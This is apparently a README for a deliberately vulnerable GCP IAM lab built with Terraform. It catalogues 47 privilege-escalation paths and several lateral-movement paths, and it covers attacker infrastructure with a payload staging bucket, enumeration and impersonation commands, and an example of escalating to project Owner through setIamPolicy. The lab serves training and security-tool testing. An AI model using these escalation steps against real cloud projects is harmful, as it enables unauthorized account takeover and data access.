# GCP IAM Vulnerable

Intentionally vulnerable GCP IAM configurations for learning privilege escalation and testing security tools.

## Prerequisites

1. **GCP Project**: An isolated test project with no production resources
2. **gcloud CLI**: Installed and configured
3. **Terraform**: Version 1.0+
4. **Permissions**: Owner or IAM Admin role on the project

## Quick Start

```bash
# Authenticate with GCP
gcloud auth login
gcloud auth application-default login

# Set your project
export PROJECT_ID="your-test-project-id"
gcloud config set project $PROJECT_ID

# Enable Service Usage API (required for Terraform to enable other APIs)
gcloud services enable serviceusage.googleapis.com --project $PROJECT_ID

# Configure your project
cp terraform.tfvars.example terraform.tfvars
# Edit terraform.tfvars and set gcp_project_id to your project ID

# Deploy (use -parallelism=2 to avoid GCP rate limits on service account creation)
terraform init
terraform apply -parallelism=2
```

**APIs enabled automatically by Terraform:**
- `iam.googleapis.com` - IAM API
- `cloudresourcemanager.googleapis.com` - Resource Manager API
- `compute.googleapis.com` - Compute Engine API
- `cloudfunctions.googleapis.com` - Cloud Functions API
- `cloudbuild.googleapis.com` - Cloud Build API
- `run.googleapis.com` - Cloud Run API
- `storage.googleapis.com` - Cloud Storage API
- `secretmanager.googleapis.com` - Secret Manager API

## Configuration

Edit `terraform.tfvars`:

```hcl
# Required: Your GCP project ID
gcp_project_id = "your-test-project-id"

# Optional: Region (default: us-central1)
gcp_region = "us-central1"

# Optional: Attacker identity (defaults to current user)
# attacker_member = "user:attacker@example.com"

# Optional: Create the project if it doesn't exist (requires billing account)
# create_project  = true
# billing_account = "XXXXXX-XXXXXX-XXXXXX"

# Optional: Organization ID for org-level privesc paths
# Note: Orgs can't be created via Terraform - requires Google Workspace/Cloud Identity
# gcp_organization_id = "123456789012"
```

### Optional: Auto-Create Project

If you don't have an existing project, Terraform can create one for you:

1. **Get your billing account ID:**
   ```bash
   gcloud billing accounts list
   ```

2. **Configure terraform.tfvars:**
   ```hcl
   gcp_project_id = "my-iam-vulnerable-test"  # Must be globally unique
   create_project = true
   billing_account = "XXXXXX-XXXXXX-XXXXXX"

   # Optional: Create under an organization (otherwise creates standalone project)
   # gcp_organization_id = "123456789012"
   ```

3. **Deploy:**
   ```bash
   terraform apply -parallelism=2
   ```

**Notes:**
- Project IDs must be globally unique across all of GCP
- A billing account is required even for free-tier resources (to enable APIs)
- Without an organization, the project is created as a "no organization" standalone project

### Optional: Setting Up a GCP Organization with Cloud Identity Free

> **Note:** A GCP Organization is **not required** for most privilege escalation paths in this project. Only org-level paths like `orgpolicy.policy.set` (privesc46) require an organization to fully exploit. Skip this section if you just want to test project-level privesc.

GCP Organizations cannot be created directly - they're automatically provisioned when you verify domain ownership through Google Workspace or Cloud Identity. Here's how to set one up for free using Cloud Identity Free:

#### Prerequisites

- A domain you own (e.g., `yourdomain.com`)
- Access to your domain's DNS settings
- A Google account

#### Step 1: Sign Up for Cloud Identity Free

1. Go to [Cloud Identity Free signup](https://workspace.google.com/signup/gcpidentity/welcome)
2. Click **Get Started**
3. Enter your business name (can be anything for testing)
4. Select **Just you** for number of employees
5. Enter your contact information
6. Enter your domain name (e.g., `yourdomain.com`)

#### Step 2: Verify Domain Ownership

Google will ask you to verify you own the domain. Choose one method:

**Option A: TXT Record (Recommended)**
1. Copy the TXT verification record Google provides
2. Add it to your domain's DNS settings:
   ```
   Type: TXT
   Host: @ (or leave blank)
   Value: google-site-verification=XXXXXXXXXXXXX
   ```
3. Wait 5-15 minutes for DNS propagation
4. Click **Verify** in the Cloud Identity setup

**Option B: CNAME Record**
1. Add the CNAME record Google provides to your DNS
2. Wait for propagation and verify

#### Step 3: Complete Setup

1. Create your admin account (e.g., `admin@yourdomain.com`)
2. Set a password
3. Skip optional setup steps (you can configure later)
4. Accept the terms of service

#### Step 4: Get Your Organization ID

Once setup completes, a GCP Organization is automatically created:

```bash
# List organizations you have access to
gcloud organizations list

# Output:
# DISPLAY_NAME     ID              DIRECTORY_CUSTOMER_ID
# yourdomain.com   123456789012    C0xxxxxxx
```

#### Step 5: Configure Terraform

Add your organization ID to `terraform.tfvars`:

```hcl
gcp_organization_id = "123456789012"
```

#### Step 6: Grant Organization-Level Permissions

For org-level privesc paths to work, grant yourself Organization Admin:

```bash
# Get your organization ID
ORG_ID=$(gcloud organizations list --format='value(ID)' --limit=1)

# Grant yourself Organization Administrator
gcloud organizations add-iam-policy-binding $ORG_ID \
  --member="user:your-email@gmail.com" \
  --role="roles/resourcemanager.organizationAdmin"
```

#### Cloud Identity Free Limits

- Up to 50 users (plenty for testing)
- No cost for the identity service
- Full GCP Organization functionality
- No Google Workspace apps (Gmail, Docs, etc.) - just identity management

#### Cleanup

To delete the organization later:
1. Go to [Google Admin Console](https://admin.google.com)
2. Account > Account settings > Delete account
3. This removes the organization and all associated resources

## What Gets Created

### Free Resources (Default)

**Shared Service Accounts:**

| SA | Email | Role | Purpose |
|----|-------|------|---------|
| IAM Viewer | `iam-vulnerable-viewer@PROJECT_ID.iam.gserviceaccount.com` | `roles/viewer` | Enumeration and reconnaissance across all scenarios |
| High-Privilege Target | `privesc-high-priv-sa@PROJECT_ID.iam.gserviceaccount.com` | `roles/owner` | Crown jewel - target for privilege escalation |

**47 Privilege Escalation Scenarios** grouped by GCP service:

| # | Scenario | Starting Endpoint | Permission(s) | Exploit Cost | Status |
|---|----------|---------------|---------------|--------------|--------|
| **IAM Service Account** | | | | | |
| 1 | setIamPolicy-project | `privesc1-set-iam-policy@PROJECT_ID.iam.gserviceaccount.com` | `resourcemanager.projects.setIamPolicy` | Free | Enabled |
| 2 | createServiceAccountKey | `privesc2-create-sa-key@PROJECT_ID.iam.gserviceaccount.com` | `iam.serviceAccountKeys.create` | Free | Enabled |
| 3 | setIamPolicy-serviceAccount | `privesc3-set-sa-iam@PROJECT_ID.iam.gserviceaccount.com` | `iam.serviceAccounts.setIamPolicy` | Free | Enabled |
| 4 | getAccessToken | `privesc4-get-access-token@PROJECT_ID.iam.gserviceaccount.com` | `iam.serviceAccounts.getAccessToken` | Free | Enabled |
| 5 | signBlob | `privesc5-sign-blob@PROJECT_ID.iam.gserviceaccount.com` | `iam.serviceAccounts.signBlob` | Free | Enabled |
| 6 | signJwt | `privesc6-sign-jwt@PROJECT_ID.iam.gserviceaccount.com` | `iam.serviceAccounts.signJwt` | Free | Enabled |
| 7 | implicitDelegation | `privesc7-implicit-delegation@PROJECT_ID.iam.gserviceaccount.com` | `iam.serviceAccounts.implicitDelegation` | Free | Enabled |
| 8 | getOpenIdToken | `privesc8-get-oidc-token@PROJECT_ID.iam.gserviceaccount.com` | `iam.serviceAccounts.getOpenIdToken` | Free | Enabled |
| 9 | updateRole | `privesc9-update-role@PROJECT_ID.iam.gserviceaccount.com` | `iam.roles.update` | Free | Enabled |
| **Compute Engine** | | | | | |
| 10 | actAs-compute | `privesc10-actas-compute@PROJECT_ID.iam.gserviceaccount.com` | `actAs` + `compute.instances.create`* | ~$0.01/hr | Enabled |
| 11 | setMetadata (manual key injection) | `privesc11-set-metadata@PROJECT_ID.iam.gserviceaccount.com` | `compute.instances.setMetadata` | ~$2-5/mo | Disabled |
| 12 | setCommonInstanceMetadata | `privesc12-set-proj-meta@PROJECT_ID.iam.gserviceaccount.com` | `compute.projects.setCommonInstanceMetadata`* | ~$2-5/mo | Disabled |
| 13 | osLogin | `privesc13-os-login@PROJECT_ID.iam.gserviceaccount.com` | `compute.instances.osAdminLogin`* | ~$2-5/mo | Disabled |
| 14 | setServiceAccount | `privesc14-set-sa@PROJECT_ID.iam.gserviceaccount.com` | `actAs` + `compute.instances.setServiceAccount` | ~$2-5/mo | Disabled |
| 16a | instanceTemplates (persistence) | `privesc16a-inst-templ@PROJECT_ID.iam.gserviceaccount.com` | `actAs` + `compute.instanceTemplates.create`* | Free | Enabled |
| 16b | instanceTemplates + instances | `privesc16b-inst-templ@PROJECT_ID.iam.gserviceaccount.com` | `actAs` + `instanceTemplates.create` + `instances.create`* | ~$0.01/hr | Enabled |
| 16c | instanceTemplates + MIG | `privesc16c-inst-templ@PROJECT_ID.iam.gserviceaccount.com` | `actAs` + `instanceTemplates.create` + `instanceGroupManagers.create`* | ~$0.01/hr | Enabled |
| **Cloud Functions** | | | | | |
| 17 | actAs-cloudfunction | `privesc17-actas-function@PROJECT_ID.iam.gserviceaccount.com` | `actAs` + `cloudfunctions.functions.create`* | Free tier | Enabled |
| 18 | updateFunction | `privesc18-update-function@PROJECT_ID.iam.gserviceaccount.com` | `cloudfunctions.functions.update` | Free | Disabled |
| **Cloud Run** | | | | | |
| 19 | actAs-cloudrun | `privesc19-actas-cloudrun@PROJECT_ID.iam.gserviceaccount.com` | `actAs` + `run.services.create`* | <$0.10/mo | Disabled |
| 20 | run.services.update | `privesc20-run-update@PROJECT_ID.iam.gserviceaccount.com` | `run.services.update` | <$0.10/mo | Disabled |
| 21 | run.jobs.create | `privesc21-run-jobs@PROJECT_ID.iam.gserviceaccount.com` | `actAs` + `run.jobs.create` | <$0.10/mo | Disabled |
| 22 | run.jobs.update | `privesc22-run-jobs-update@PROJECT_ID.iam.gserviceaccount.com` | `run.jobs.update` + `actAs`* | <$0.10/mo | Disabled |
| **Cloud Build** | | | | | |
| 23a | actAs-cloudbuild (direct) | `privesc23a-actas-cloudbuild@PROJECT_ID.iam.gserviceaccount.com` | `actAs` + `cloudbuild.builds.create`* | Free tier | Enabled |
| 23b | cloudbuild.triggers (persistent) | `privesc23b-triggers@PROJECT_ID.iam.gserviceaccount.com` | `actAs` + `cloudbuild.builds.create` | Free | Enabled |
| 24 | cloudbuild.builds.update | `privesc24-builds-update@PROJECT_ID.iam.gserviceaccount.com` | `actAs` + `cloudbuild.builds.update` | Free | Enabled |
| **Cloud Scheduler** | | | | | |
| 25 | cloudScheduler (create) | `privesc25-scheduler@PROJECT_ID.iam.gserviceaccount.com` | `actAs` + `cloudscheduler.jobs.create` | Free tier | Enabled |
| 26 | cloudScheduler (update) | `privesc26-scheduler-update@PROJECT_ID.iam.gserviceaccount.com` | `actAs` + `cloudscheduler.jobs.update` | Minimal | Disabled |
| **Deployment Manager** *(End of support: March 31, 2026)* | | | | | |
| 27 | deploymentManager (create) | `privesc27-deployment-manager@PROJECT_ID.iam.gserviceaccount.com` | `actAs` + `deploymentmanager.deployments.create`* | Free | Enabled |
| 28 | deploymentManager (update) | `privesc28-dm-update@PROJECT_ID.iam.gserviceaccount.com` | `actAs` + `deploymentmanager.deployments.update` | ~$0.02/mo | Disabled |
| **Composer** | | | | | |
| 29 | composer (create) | `privesc29-composer@PROJECT_ID.iam.gserviceaccount.com` | `actAs` + `composer.environments.create` + `storage.objects.create` | ~$400/mo | Enabled |
| 30 | composer (update) | `privesc30-composer-update@PROJECT_ID.iam.gserviceaccount.com` | `composer.environments.update` + `storage.objects.create` | ~$400/mo | Disabled |
| **Dataflow** | | | | | |
| 31 | dataflow | `privesc31-dataflow@PROJECT_ID.iam.gserviceaccount.com` | `actAs` + `dataflow.jobs.create`* | ~$0.05/hr | Enabled |
| 32 | dataflow.jobs.updateContents | (disabled - enable_privesc32) | dataflow.jobs.updateContents + dataflow.jobs.cancel | ~$0.05/hr | Disabled |
| **Dataproc** | | | | | |
| 33 | dataproc.clusters.create | `privesc33-dataproc@PROJECT_ID.iam.gserviceaccount.com` | `actAs` + `dataproc.clusters.create` | ~$0.10/hr | Enabled |
| 34 | dataproc.jobs.create | `privesc34-dataproc-jobs@PROJECT_ID.iam.gserviceaccount.com` | `dataproc.jobs.create` | Free | Enabled |
| **GKE/Kubernetes** | | | | | |
| 35 | container.clusters.create | `privesc35-gke@PROJECT_ID.iam.gserviceaccount.com` | `actAs` + `container.clusters.create` | ~$70/mo | Enabled |
| 36 | container.clusters.getCredentials | `privesc36-gke-creds@PROJECT_ID.iam.gserviceaccount.com` | `container.clusters.getCredentials` | Free | Enabled |
| **Vertex AI / AI Platform** | | | | | |
| 37 | notebooks.instances.create | `privesc37-notebooks@PROJECT_ID.iam.gserviceaccount.com` | `actAs` + `notebooks.instances.create` | ~$25/mo | Enabled |
| 38 | notebooks.instances.setIamPolicy | (disabled - enable_privesc38) | `notebooks.instances.setIamPolicy` | Free | Disabled |
| 39 | aiplatform.customJobs.create | `privesc39-aiplatform@PROJECT_ID.iam.gserviceaccount.com` | `actAs` + `aiplatform.customJobs.create` | Varies | Enabled |
| **Cloud Workflows** | | | | | |
| 40 | workflows.workflows.create | `privesc40-workflows@PROJECT_ID.iam.gserviceaccount.com` | `actAs` + `workflows.workflows.create` | Free tier | Enabled |
| 41 | workflows.workflows.update | (disabled - enable_privesc41) | `actAs` + `workflows.workflows.update` | Free | Disabled |
| **Eventarc** | | | | | |
| 42 | eventarc.triggers.create | `privesc42-eventarc@PROJECT_ID.iam.gserviceaccount.com` | `actAs` + `eventarc.triggers.create` | Free | Enabled |
| 43 | eventarc.triggers.update | (disabled - enable_privesc43) | `actAs` + `eventarc.triggers.update` | Free | Disabled |
| **Workload Identity** | | | | | |
| 44 | workloadIdentityPoolProviders.create | `privesc44-workload-identity@PROJECT_ID.iam.gserviceaccount.com` | `iam.workloadIdentityPoolProviders.create` | Free | Enabled |
| 45 | workloadIdentityPoolProviders.update | (disabled - enable_privesc45) | `iam.workloadIdentityPoolProviders.update` | Free | Disabled |
| **Org Policy** | | | | | |
| 46 | orgpolicy.policy.set | `privesc46-org-policy@PROJECT_ID.iam.gserviceaccount.com` | `orgpolicy.policy.set` | Free | Disabled |
| **Deny Bypass** | | | | | |
| 47 | explicitDeny-bypass | `privesc47-deny-bypass@PROJECT_ID.iam.gserviceaccount.com` | SA chaining | Free | Enabled |

#### Lateral Movement Paths (Honorable Mentions)

These paths demonstrate **data access and lateral movement**, NOT privilege escalation. They allow accessing sensitive data but don't grant higher IAM privileges.

| # | Name | Service Account | Vulnerable Permission | Category |
|---|------|-----------------|----------------------|----------|
| L7 | existingSSH | `lateral7-ssh@PROJECT_ID.iam.gserviceaccount.com` | Existing SSH key access | Credential Theft |
| L1 | setIamPolicy-bucket | `lateral1-bucket-iam@PROJECT_ID.iam.gserviceaccount.com` | `storage.buckets.setIamPolicy` | Data Access |
| L2 | storage.objects.create | `lateral2-storage-write@PROJECT_ID.iam.gserviceaccount.com` | `storage.objects.create` | Persistence |
| L3 | secretManager.access | `lateral3-secret-access@PROJECT_ID.iam.gserviceaccount.com` | `secretmanager.versions.access` | Data Exfil |
| L4 | secretManager.setIamPolicy | `lateral4-secret-setiam@PROJECT_ID.iam.gserviceaccount.com` | `secretmanager.secrets.setIamPolicy` | Data Access |
| L5 | setIamPolicy-pubsub | `lateral5-pubsub-iam@PROJECT_ID.iam.gserviceaccount.com` | `pubsub.topics.setIamPolicy` | Data Access |
| L6 | bigquery.setIamPolicy | `lateral6-bq-setiam@PROJECT_ID.iam.gserviceaccount.com` | `bigquery.datasets.setIamPolicy` | Data Access |

> **Permission Notes:**
> - `*` = Requires supporting permissions beyond the vulnerable permission. See [EXPLOITATION_GUIDE.md](EXPLOITATION_GUIDE.md) for details.
>   - Path 10: Exploitation requires `compute.disks.create`, `compute.instances.setServiceAccount`, `compute.subnetworks.use`, `compute.subnetworks.useExternalIp`. SSH access handled by project-level SSH user role.
>   - Path 12: Also requires `compute.projects.get`, `compute.instances.list`, `compute.instances.get`, `compute.zones.list`
>   - Path 13: Also requires `roles/compute.viewer` (`compute.instances.get`, `compute.instances.list`, etc.)
>   - Path 14: Also requires `compute.instances.get`, `compute.instances.stop`, `compute.instances.start`
>   - Path 16a: Also requires `compute.networks.get`, `compute.subnetworks.get`
>   - Path 16b: Exploitation requires `compute.networks.get`, `compute.subnetworks.get`, `compute.disks.create`, `compute.instances.setServiceAccount`. Completion requires `compute.subnetworks.use`, `compute.subnetworks.useExternalIp`, `compute.instances.setMetadata`
>   - Path 16c: Exploitation requires `compute.networks.get`, `compute.subnetworks.get`, `compute.instances.create`, `compute.instances.setServiceAccount`, `compute.disks.create`. Completion requires `compute.subnetworks.use`, `compute.subnetworks.useExternalIp`, `compute.instances.setMetadata`
>   - Path 17: Also requires `cloudfunctions.functions.get`, `cloudfunctions.functions.sourceCodeSet`, `cloudfunctions.operations.get`
>   - Path 20: Also requires `run.services.get`, `run.operations.get`, `run.revisions.get`
>   - Path 21: Also requires `run.jobs.get`, `run.jobs.run`, `run.executions.get`
>   - Path 22: Also requires `run.jobs.get`, `run.jobs.run`, `run.executions.get`
>   - Path 23a: Also requires `cloudbuild.builds.get`
>   - Path 23b: Also requires `cloudbuild.builds.get`, `cloudbuild.builds.list`
>   - Path 24: Also requires `cloudbuild.builds.get`, `cloudbuild.builds.list`, `serviceusage.services.use`. Requires `iam.serviceAccounts.actAs` on both the original and new SA when swapping service accounts.
>   - Path 26: Also requires `deploymentmanager.deployments.get`, `deploymentmanager.operations.get`, `deploymentmanager.manifests.get`
>   - Path 28: Also requires `dataflow.jobs.get`
>
> **Status Legend:**
> - **Enabled** = IAM resources created by default, exploitable immediately
> - **Disabled** = Requires opt-in variable (see below)
>
> **Disabled Paths - Enable individually:**
> | Path | Variable | Creates | Cost |
> |------|----------|---------|------|
> | 11 | `enable_privesc11 = true` | VM + IAM | ~$2-5/mo |
> | 12 | `enable_privesc12 = true` | VM + IAM | ~$2-5/mo |
> | 13 | `enable_privesc13 = true` | VM + IAM | ~$2-5/mo |
> | 14 | `enable_privesc14 = true` | VM + IAM | ~$2-5/mo |
> | L7 | `enable_lateral7 = true` | VM + IAM | ~$2-5/mo |
> | 18 | `enable_privesc18 = true` | Function + IAM | Free (idle) |
> | 19 | `enable_privesc19 = true` | Cloud Run + Artifact Registry + IAM | <$0.10/mo |
> | 20 | `enable_privesc20 = true` | Cloud Run + Artifact Registry + IAM | <$0.10/mo |
> | 21 | `enable_privesc21 = true` | Cloud Run + Artifact Registry + IAM | <$0.10/mo |
> | 22 | `enable_privesc22 = true` | Cloud Run + Artifact Registry + IAM | <$0.10/mo |
> | 26 | `enable_privesc26 = true` | Scheduler Job + IAM | Minimal |
> | 28 | `enable_privesc28 = true` | DM Deployment + IAM | ~$0.02/mo |
> | 30 | `enable_privesc30 = true` | Composer Env + IAM | ~$400/mo |
> | 32 | `enable_privesc32 = true` | Dataflow Job + IAM | ~$0.05/hr |
> | 38 | `enable_privesc38 = true` | IAM only | Free |
> | 41 | `enable_privesc41 = true` | IAM only | Free |
> | 43 | `enable_privesc43 = true` | IAM only | Free |
> | 45 | `enable_privesc45 = true` | IAM only | Free |
> | 46 | `enable_privesc46 = true` | IAM only | Free (requires `gcp_organization_id`) |
>
> **Note:** "Exploit Cost" is what it costs to actually exploit the path. "Enabled" paths create only IAM resources (free) but exploitation may create billable resources (e.g., privesc10 creates a VM when exploited).

**Tool Testing Resources:**
- False Negative tests (should be detected)
- False Positive tests (should not be flagged)

### Disabled Privesc Paths (Optional)

Some privesc paths are disabled by default because they require target infrastructure (costs money) or a GCP Organization. Enable individually in `terraform.tfvars`:

```hcl
gcp_project_id = "your-test-project-id"

# Compute-based paths (creates VM, ~$2-5/mo each)
enable_privesc11 = true   # setMetadata (manual key injection)
enable_privesc12 = true   # setCommonInstanceMetadata (project-level)
enable_privesc13 = true   # osLogin
enable_privesc14 = true   # setServiceAccount
enable_lateral7  = true   # existingSSH (lateral movement)

# Cloud Functions paths (creates function, free when idle)
enable_privesc18 = true  # updateFunction

# Cloud Run paths (creates service + token-extractor image, <$0.10/mo)
enable_privesc19 = true  # actAs + run.services.create
enable_privesc20 = true  # run.services.update
enable_privesc21 = true  # run.jobs.create
enable_privesc22 = true  # run.jobs.update

# Cloud Scheduler update path (creates target job, minimal cost)
enable_privesc26 = true  # cloudscheduler.jobs.update

# Deployment Manager update path (creates target deployment, ~$0.02/mo)
enable_privesc28 = true  # deploymentmanager.deployments.update

# Composer update path (creates target environment, ~$400/mo!)
enable_privesc30 = true  # composer.environments.update

# Dataflow update path (creates target streaming job, ~$0.05/hr)
enable_privesc32 = true  # dataflow.jobs.updateContents

# Update paths (hijack existing infrastructure, IAM only)
enable_privesc38 = true  # notebooks.instances.setIamPolicy
enable_privesc41 = true  # workflows.workflows.update
enable_privesc43 = true  # eventarc.triggers.update
enable_privesc45 = true  # iam.workloadIdentityPoolProviders.update

# Organization paths (requires gcp_organization_id)
# gcp_organization_id = "123456789012"
# enable_privesc46 = true  # orgpolicy.policy.set
```

**Or via command line:**
```bash
terraform apply -parallelism=2 -var="enable_privesc11=true" -var="gcp_project_id=iam-vulnerable"

# With organization (for privesc46)
terraform apply -parallelism=2 -var="gcp_project_id=iam-vulnerable" -var="gcp_organization_id=123456789012" -var="enable_privesc46=true"
```

## Attacker Infrastructure (Optional)

A separate Terraform root at `gcp/attacker-infra/` provides an attacker box and staging bucket, deployed independently from the privesc paths (separate state).

**What it creates:**

| Resource | Lifecycle | Cost |
|----------|-----------|------|
| **VPC + Firewall** | Always (free) | Free |
| **SSH Key** | Always (free, persists across rebuilds) | Free |
| **Storage Bucket** | Always (free unless objects stored) | Free (empty) |
| **Compute Instance** (`e2-micro`, spot) | Gated by `enable_attacker_instance` | ~$2-5/mo |
| **TLS Certificate** (optional) | On boot if `enable_certbot = true` | Free |

### Cost Analysis

| Resource | Always Created | Cost | Notes |
|----------|---------------|------|-------|
| **VPC Network** | Yes | Free | Custom VPC, no charges for the network itself |
| **Subnet** | Yes | Free | No charges for subnet allocation |
| **Firewall Rules** (x2) | Yes | Free | No charges for firewall rules |
| **SSH Key** (TLS + local file) | Yes | Free | Generated locally, no GCP charges |
| **Storage Bucket** | Yes | Free (empty) | $0.020/GB/mo for Standard in US multi-region; free while empty |
| **Compute Instance** (`e2-micro`, spot) | Only if `enable_attacker_instance = true` | ~$0.002/hr (~$1.50/mo) | Spot pricing; standard would be ~$0.008/hr (~$6/mo). 10GB `pd-standard` boot disk adds ~$0.40/mo |
| **TLS Certificate** (Let's Encrypt) | Only if `enable_certbot = true` | Free | Let's Encrypt + sslip.io, no cost |
| **Ephemeral External IP** | With instance | Free while attached | Charged ~$0.004/hr only if reserved but unattached |
| **API Enablement** (Compute, Storage) | Yes | Free | Enabling APIs has no cost |

**Total cost when instance is running:** ~$2/mo (spot) or ~$6.50/mo (standard)
**Total cost when instance is destroyed:** $0 (bucket, VPC, SSH key, firewall rules are all free)

> **Tip:** Use `terraform apply -var="enable_attacker_instance=false"` to destroy only the instance when not in use. All free resources persist, and spinning back up takes ~60 seconds.

### Deploy

```bash
cd gcp/attacker-infra
cp terraform.tfvars.example terraform.tfvars
# Edit terraform.tfvars with your project ID

terraform init
terraform apply
```

### Spin Down / Spin Up the Instance

Only the compute instance costs money. Destroy it while keeping the bucket, VPC, and SSH key:

```bash
# Destroy instance only (bucket, VPC, SSH key persist)
terraform apply -var="enable_attacker_instance=false"

# Spin it back up
terraform apply -var="enable_attacker_instance=true"
```

### TLS Certificates (Optional)

Set `enable_certbot = true` to request a trusted Let's Encrypt certificate on boot. By default it uses [sslip.io](https://sslip.io) (free wildcard DNS that resolves `IP.sslip.io` to that IP) - no DNS setup needed.

```hcl
enable_certbot = true
# dns_name = "attacker.example.com"  # optional: use your own domain instead of sslip.io
```

Certs are always at `~/certs/fullchain.pem` and `~/certs/privkey.pem`, owned by the SSH user. Falls back to self-signed if Let's Encrypt fails. If the instance is destroyed and recreated, new certs are generated on boot.

Check cert status on the instance:
```bash
ls -la ~/certs/
sudo cat /var/log/certbot-startup.log
```

### Connect

```bash
# Terraform outputs a ready-to-use SSH command
terraform output ssh_command

# Or manually
ssh -i attacker-ssh-key.pem USERNAME@INSTANCE_IP
```

### Use the Staging Bucket

```bash
# Upload payloads
gsutil cp payload.sh gs://$(terraform output -raw attacker_bucket_name)/

# Download from the attacker instance
gsutil cp gs://BUCKET_NAME/payload.sh .
```

### Cleanup

```bash
# Full cleanup (destroys everything including bucket and VPC)
cd gcp/attacker-infra
terraform destroy
```

This does not affect the main `gcp/` Terraform state.

## Cost Summary

| Configuration | Cost/Hour | Cost/Month |
|---------------|-----------|------------|
| **Default (IAM-only paths)** | **$0.00** | **$0** |
| + Compute module (preemptible) | +$0.002 | +$2-3 |
| + Compute module (standard) | +$0.008 | +$6-7 |
| + Cloud Functions (idle) | +$0.00 | Free tier |
| + Cloud Run paths 19-22 | +$0.00 | <$0.10 |
| **All modules enabled** | ~$0.01 | ~$5-10 |
| | | |
| **Attacker Infra** (separate state) | | |
| + Free resources only (VPC, bucket, SSH key) | $0.00 | $0 |
| + Instance running (spot e2-micro) | +$0.002 | +~$2 |
| + Instance running (standard e2-micro) | +$0.008 | +~$6.50 |

**Note:** The default deployment creates only IAM resources (service accounts, custom roles, IAM bindings) which are **completely free**. Non-free modules must be explicitly enabled. Attacker infrastructure is a separate Terraform root (`gcp/attacker-infra/`) with its own state - see [Attacker Infrastructure](#attacker-infrastructure-optional) for details.

## Testing with FoxMapper

```bash
# Create a graph of your vulnerable project
foxmapper gcp graph create --project YOUR_PROJECT_ID

# Find privilege escalation paths
foxmapper gcp argquery --preset privesc --project YOUR_PROJECT_ID

# Find multiple paths
foxmapper gcp argquery --preset privesc --project YOUR_PROJECT_ID --paths 3

# List all admins
foxmapper gcp argquery --preset admin --project YOUR_PROJECT_ID
```

## Troubleshooting

### Rate Limit Errors (429 - Service Accounts per Minute)

GCP limits service account creation to ~5-10 per minute per project. **Always use `-parallelism=2`** to avoid hitting this limit:

```bash
# Recommended for all runs
terraform apply -parallelism=2

# Or for very strict rate limiting, use parallelism=1
terraform apply -parallelism=1
```

The Terraform configuration includes batched delays, but on retries after errors the delays have already completed and pending resources try to create at once. Using `-parallelism=2` prevents this.

### Compute Engine Quota Errors on New Projects

New GCP projects have low default Compute Engine quotas. You may see `ZONE_RESOURCE_POOL_EXHAUSTED`, `Rate Limit Exceeded`, or `Quota on concurrent operations exceeded` errors when exploiting compute-based paths (10, 11-14, 16b-16c).

**Fixes:**
1. **Try a different zone/region:** Add `--zone=us-east1-b` or `--machine-type=e2-micro`
2. **Wait and retry:** Transient rate limits often clear within 30-60 seconds
3. **Request quota increases:** Go to [IAM & Admin > Quotas & System Limits](https://console.cloud.google.com/iam-admin/quotas), filter for `Compute Engine API`, and request increases for your region

### Cloud Functions Build Errors

If you see errors about bucket access being denied for the compute service account:

```
Access to bucket gcf-sources-XXXXX denied. You must grant Storage Object Viewer permission
```

This is usually an IAM propagation delay. The fix has been applied (90s wait), but if it still fails:

```bash
# Wait a minute, then re-apply
sleep 60 && terraform apply -parallelism=2
```

### Organization Policy Errors

The `orgpolicy.policy.set` permission cannot be used in custom roles - this is a GCP limitation. The privesc46 path uses the predefined `roles/orgpolicy.policyAdmin` role instead.

**Note:** Actually modifying organization policies requires:
1. A GCP Organization (tied to a verified domain via Google Workspace or Cloud Identity)
2. The role granted at the organization level, not just project level

Set the optional `gcp_organization_id` variable if you have an org and want full functionality.

## Cleanup

### Standard Cleanup

```bash
terraform destroy
```

### When Terraform State is Lost

```bash
cd cleanup-scripts

# Preview what will be deleted
./cleanup_iam_vulnerable.sh --project YOUR_PROJECT_ID --dry-run

# Execute cleanup
./cleanup_iam_vulnerable.sh --project YOUR_PROJECT_ID
```

## Security Warning

**These resources are intentionally insecure.** Only deploy in:
- Isolated test projects
- Projects with no sensitive data
- Projects not connected to production systems

## Exploitation Quick Start

This section provides a quick introduction to exploiting the privilege escalation paths. For complete step-by-step instructions for all 47 scenarios, see [EXPLOITATION_GUIDE.md](EXPLOITATION_GUIDE.md).

### How It Works

Each privesc path follows this pattern:
1. **Enumerate** using the **IAM Viewer SA** to discover vulnerable resources and service accounts
2. **Impersonate** the **vulnerable service account** for a specific path
3. **Escalate** using the vulnerable SA's permissions to reach the **high-privilege SA**
4. The **high-privilege SA** (`privesc-high-priv-sa@PROJECT.iam.gserviceaccount.com`) has Owner role

**Key Service Accounts:**
| SA | Role | Purpose |
|----|------|---------|
| `iam-vulnerable-viewer@PROJECT_ID.iam` | Viewer | Enumeration / reconnaissance |
| `privesc-high-priv-sa@PROJECT_ID.iam` | Owner | Target (crown jewel) |

### Step 0: Enumerate with the Viewer SA

Before exploiting any path, use the IAM Viewer SA to discover what's in the project:

```bash
export PROJECT_ID="your-project-id"
export VIEWER_SA="iam-vulnerable-viewer@$PROJECT_ID.iam.gserviceaccount.com"

# Impersonate the viewer SA
gcloud config set auth/impersonate_service_account $VIEWER_SA

# List all service accounts and their IAM bindings
gcloud iam service-accounts list --project=$PROJECT_ID
gcloud projects get-iam-policy $PROJECT_ID --flatten="bindings[].members" \
  --format="table(bindings.role, bindings.members)"

# List custom roles (reveals vulnerable permissions)
gcloud iam roles list --project=$PROJECT_ID --format="table(name, title)"
gcloud iam roles describe ROLE_ID --project=$PROJECT_ID

# Enumerate compute, functions, run, etc.
gcloud compute instances list --project=$PROJECT_ID
gcloud functions list --project=$PROJECT_ID
gcloud run services list --project=$PROJECT_ID

# Clear impersonation when done enumerating
gcloud config unset auth/impersonate_service_account
```

**With CloudFox:**

```bash
# Run CloudFox with the viewer SA for automated enumeration
cloudfox gcp --project $PROJECT_ID \
  --service-account $VIEWER_SA
```

### Basic Impersonation

```bash
# Set your project
export PROJECT_ID="your-project-id"

# Method 1: Set impersonation globally
gcloud config set auth/impersonate_service_account SERVICE_ACCOUNT_EMAIL

# Method 2: Per-command impersonation
gcloud COMMAND --impersonate-service-account=SERVICE_ACCOUNT_EMAIL

# Method 3: Generate access token
gcloud auth print-access-token --impersonate-service-account=SERVICE_ACCOUNT_EMAIL
```

### Example: Path 1 - setIamPolicy on Project

```bash
# Impersonate the vulnerable SA
gcloud config set auth/impersonate_service_account \
  privesc1-set-iam-policy@$PROJECT_ID.iam.gserviceaccount.com

# Get current IAM policy
gcloud projects get-iam-policy $PROJECT_ID --format=json > policy.json

# Edit policy.json to add yourself as Owner, then apply
gcloud projects set-iam-policy $PROJECT_ID policy.json

# Clear impersonation
